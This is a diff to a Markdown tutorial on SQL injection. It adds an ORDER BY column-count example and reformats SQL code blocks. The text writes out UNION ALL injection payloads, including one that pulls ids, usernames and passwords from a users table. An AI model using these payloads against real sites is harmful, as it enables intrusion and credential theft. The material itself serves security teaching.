@@ -111,7 +111,10 @@ SELECT id, title, content WHERE id = '1' UNION ALL SELECT 1, 2, 3 -- - OK!'
 ```
 
 We can achieve the same result using the `ORDER BY` strategy.
+
 `ORDER BY` can accept a column name as parameter, but also a number to identify a column.
+
+Using `$_GET[id] = "1' ORDER BY 1 -- -"`, the query produced will be:
 
 ```sql
 SELECT id, title, content FROM pages WHERE id = '1' ORDER BY 1 -- -' OK!
@@ -165,14 +168,14 @@ how many columns get printed.
 If we got only `1` column that gets printed we can use some trick to output
 multiple columns at once.
 
-`sql
+```sql
 SELECT CONCAT('coppito', 'zero', 'day');
-`
+```
 Will return `coppitozeroday`
 
-`sql
+```sql
 SELECT CONCAT_WS('_', 'coppito', 'zero', 'day');
-`
+```
 Will return `coppito_zero_day`. The first argument is the separator.
 
 #### How to exploit it?
@@ -205,8 +208,10 @@ SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1, username
 How can we get all the `users` table in one query?
 
 Using `$_GET[id] = "' UNION ALL SELECT 1, CONCAT_WS('|', id, username, password), 3 FROM users -- -"`, the query produced will be:
-```
-  SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1, CONCAT_WS('|', id, username, password), 3 FROM users -- -'
+```sql
+  SELECT id, title, content FROM pages WHERE id = '1'
+  UNION ALL
+  SELECT 1, CONCAT_WS('|', id, username, password), 3 FROM users -- -'
 ```
 We will get:
 
@@ -245,7 +250,9 @@ We have to add a condition that always makes the WHERE clause false, before our 
 
 Using `$_GET[id] = "'AND 1=0 UNION ALL SELECT 1, 2, 3 FROM users -- -"`, the query produced will be:
 ```
-  SELECT id, title, content FROM pages WHERE id = '1' AND 1=0 UNION ALL SELECT 1, 2, 3 FROM users -- - LIMIT 1'
+  SELECT id, title, content FROM pages WHERE id = '1' AND 1=0
+  UNION ALL
+  SELECT 1, 2, 3 FROM users -- - LIMIT 1'
 ```
 
 We will get:
